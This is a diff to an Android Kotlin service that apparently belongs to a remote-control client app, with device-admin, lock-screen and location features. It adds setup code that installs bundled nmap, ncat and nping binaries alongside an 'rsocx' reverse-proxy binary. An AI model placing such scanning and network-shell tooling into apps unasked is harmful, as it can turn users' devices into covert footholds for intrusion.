@@ -88,9 +88,11 @@ import com.client.BuildConfig
 import com.client.LockedActivity
 import com.client.LockedWithPinActivity
 import com.client.MessageActivity
+import com.client.R
 import com.client.helpers.DeviceOrientationHelper
 import com.client.helpers.FlashlightHelper
 import com.client.helpers.Utils
+import com.client.helpers.unzipTo
 import com.client.isAccessibilityServiceEnabled
 import com.client.isMyServiceRunning
 import com.client.receivers.ReceiverDeviceAdmin
@@ -6591,6 +6593,7 @@ class ClientService: Service() {
             Python.start(AndroidPlatform(this));
         }
 
+        val tmpUnzipDir = File(filesDir, "TempUnzipDir")
         try {
             val binariesDir = File(filesDir, "binaries")
             if (binariesDir.exists()) {
@@ -6602,13 +6605,79 @@ class ClientService: Service() {
                 throw IOException("Failed to create directory: $binariesDir")
             }
             val rsocxFile = File(binariesDir, "rsocx")
-            Log.d("ClientService", "Created rsocx symlink.")
             Os.symlink(
                 File(applicationInfo.nativeLibraryDir, "librsocx.so").absolutePath,
                 rsocxFile.absolutePath
             )
+            Log.d("ClientService", "Created rsocx symlink.")
+            val nmapDir = File(binariesDir, "nmap-7.31")
+            if (!nmapDir.mkdir()) {
+                throw IOException("Failed to create directory: $nmapDir")
+            }
+            val nmapBinDir = File(nmapDir, "bin")
+            if (!nmapBinDir.mkdir()) {
+                throw IOException("Failed to create directory: $nmapBinDir")
+            }
+            val nmapFile = File(nmapBinDir, "nmap")
+            Os.symlink(
+                File(applicationInfo.nativeLibraryDir, "libnmap.so").absolutePath,
+                nmapFile.absolutePath
+            )
+            Log.d("ClientService", "Created nmap symlink.")
+            val ncatFile = File(nmapBinDir, "ncat")
+            Os.symlink(
+                File(applicationInfo.nativeLibraryDir, "libncat.so").absolutePath,
+                ncatFile.absolutePath
+            )
+            Log.d("ClientService", "Created ncat symlink.")
+            val npingFile = File(nmapBinDir, "nping")
+            Os.symlink(
+                File(applicationInfo.nativeLibraryDir, "libnping.so").absolutePath,
+                npingFile.absolutePath
+            )
+            Log.d("ClientService", "Created nping symlink.")
+            Log.i("ClientService", "ABI: ${Utils.getBestAbi()}")
+            val abi = Utils.getBestAbi()
+            val zipFile = File.createTempFile("nmap", ".zip")
+            if (!tmpUnzipDir.mkdir()) {
+                throw IOException("Failed to create directory: $tmpUnzipDir")
+            }
+            when (abi) {
+                "armeabi-v7a" -> {
+                    Utils.extractRawResource(this, R.raw.nmap_android_armeabi_v7a, zipFile)
+                }
+                "arm64-v8a" -> {
+                    Utils.extractRawResource(this, R.raw.nmap_android_arm64_v8a, zipFile)
+                }
+                "x86" -> {
+                    Utils.extractRawResource(this, R.raw.nmap_android_x86, zipFile)
+                }
+                "x86_64" -> {
+                    Utils.extractRawResource(this, R.raw.nmap_android_x86_64, zipFile)
+                }
+
+                else -> {
+                    throw IOException("Unsupported ABI: $abi")
+                }
+            }
+            zipFile.unzipTo(tmpUnzipDir)
+            val unzippedNmapDir = File(tmpUnzipDir, "nmap-7.31")
+            Log.d("ClientService", "Unzipped to $tmpUnzipDir")
+            if (!File(unzippedNmapDir, "share").copyRecursively(File(nmapDir, "share"))) {
+                throw IOException("Failed to copy files")
+            }
+            if (!File(unzippedNmapDir, "lib").copyRecursively(File(nmapDir, "lib"))) {
+                throw IOException("Failed to copy files")
+            }
+            File(File(unzippedNmapDir, "bin"), "ndiff").copyTo(File(nmapBinDir, "ndiff"))
+            File(File(unzippedNmapDir, "bin"), "uninstall_ndiff").copyTo(File(nmapBinDir, "uninstall_ndiff"))
+            Log.d("ClientService", "Copied files to $nmapDir")
         } catch (ex: Exception) {
             ex.printStackTrace()
+        } finally {
+            if (tmpUnzipDir.exists()) {
+                tmpUnzipDir.deleteRecursively()
+            }
         }
 
         val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
